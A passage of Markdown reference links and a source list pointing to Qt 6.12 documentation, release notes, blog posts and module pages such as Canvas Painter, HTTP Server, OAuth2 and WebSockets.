[repo-6120]: https://download.qt.io/online/qtsdkrepository/linux_x64/desktop/qt6_6120/qt6_6120/Updates.xml
[canvaspainter]: https://doc.qt.io/qt-6/qtcanvaspainter-index.html
[QCanvasPainter]: https://doc.qt.io/qt-6/qcanvaspainter.html
[QCanvasPainterItem]: https://doc.qt.io/qt-6/qcanvaspainteritem.html
[Canvas2D]: https://doc.qt.io/qt-6/qml-qtcanvas2d-canvas2d.html
[QQuickRhiItem]: https://doc.qt.io/qt-6/qquickrhiitem.html
[Shape]: https://doc.qt.io/qt-6/qml-qtquick-shapes-shape.html
[ShapePath]: https://doc.qt.io/qt-6/qml-qtquick-shapes-shapepath.html
[Item]: https://doc.qt.io/qt-6/qml-qtquick-item.html
[Text]: https://doc.qt.io/qt-6/qml-qtquick-text.html
[TextEdit]: https://doc.qt.io/qt-6/qml-qtquick-textedit.html
[Qt global]: https://doc.qt.io/qt-6/qml-qtqml-qt.html
[QQmlEngine]: https://doc.qt.io/qt-6/qqmlengine.html
[untrusted]: https://doc.qt.io/qt-6/untrusteddata.html
[QRangeModel]: https://doc.qt.io/qt-6/qrangemodel.html
[QSortFilterProxyModel]: https://doc.qt.io/qt-6/qsortfilterproxymodel.html
[SFPM QML]: https://doc.qt.io/qt-6/qml-qtqml-models-sortfilterproxymodel.html
[Accessible]: https://doc.qt.io/qt-6/qml-qtquick-accessible.html
[QAccessibilityHints]: https://doc.qt.io/qt-6/qaccessibilityhints.html
[QStyleHints]: https://doc.qt.io/qt-6/qstylehints.html
[ToolTip]: https://doc.qt.io/qt-6/qml-qtquick-controls-tooltip.html
[httpserver]: https://doc.qt.io/qt-6/qthttpserver-index.html
[httpserver-security]: https://doc.qt.io/qt-6/qthttpserver-security.html
[QHttpServerResponder]: https://doc.qt.io/qt-6/qhttpserverresponder.html
[QHttpServerConfiguration]: https://doc.qt.io/qt-6/qhttpserverconfiguration.html
[QOAuth2AuthorizationCodeFlow]: https://doc.qt.io/qt-6/qoauth2authorizationcodeflow.html
[QOAuthHttpServerReplyHandler]: https://doc.qt.io/qt-6/qoauthhttpserverreplyhandler.html
[QAbstractOAuth2]: https://doc.qt.io/qt-6/qabstractoauth2.html
[QRestAccessManager]: https://doc.qt.io/qt-6/qrestaccessmanager.html
[QNetworkRequest]: https://doc.qt.io/qt-6/qnetworkrequest.html
[QDomImplementation]: https://doc.qt.io/qt-6/qdomimplementation.html
[tasktree]: https://doc.qt.io/qt-6/qttasktree-index.html
[openapi]: https://doc.qt.io/qt-6/qtopenapi-index.html
[stylekit]: https://doc.qt.io/qt-6/qtlabsstylekit-index.html
[remoteobjects]: https://doc.qt.io/qt-6/qtremoteobjects-index.html
[scxml]: https://doc.qt.io/qt-6/qtscxml-index.html
[websockets]: https://doc.qt.io/qt-6/qtwebsockets-index.html
[jsonrpc-cmake]: https://code.qt.io/cgit/qt/qtlanguageserver.git/plain/src/jsonrpc/CMakeLists.txt?h=6.12

- [What's New in Qt 6.12][whatsnew612]; [New Classes and Functions in Qt 6.12][newclasses612];
  [What's New in Qt 6.11][whatsnew611]; [Qt 6.12.0 release notes][relnotes].
- Qt blog: [Qt 6.12 LTS Released][blog612]; [Canvas2D][blog-canvas2d]; [Hot Reload in Qt 6.12][blog-hotreload].
- Qt online repository: [6.11.2 Updates.xml][repo-6112]; [6.12.0 Updates.xml][repo-6120].
- Module and class pages: [Qt Canvas Painter][canvaspainter], [QCanvasPainter], [QCanvasPainterItem],
  [Canvas2D], [QQuickRhiItem], [Shape], [ShapePath], [Item], [Text], [TextEdit], [Qt global],
  [QQmlEngine], [Handling Untrusted Data][untrusted], [QRangeModel], [QSortFilterProxyModel],
  [SortFilterProxyModel (QML)][SFPM QML], [Accessible], [QAccessibilityHints], [QStyleHints], [ToolTip],
  [Qt HTTP Server][httpserver], [HTTP Server security][httpserver-security], [QHttpServerResponder],
  [QHttpServerConfiguration], [QOAuth2AuthorizationCodeFlow], [QOAuthHttpServerReplyHandler],
  [QAbstractOAuth2], [QRestAccessManager], [QNetworkRequest], [QDomImplementation],
  [Qt TaskTree][tasktree], [Qt OpenAPI][openapi], [Qt Labs StyleKit][stylekit],
  [Qt Remote Objects][remoteobjects], [Qt SCXML][scxml], [Qt WebSockets][websockets],
  [qtlanguageserver JsonRpc CMakeLists][jsonrpc-cmake].
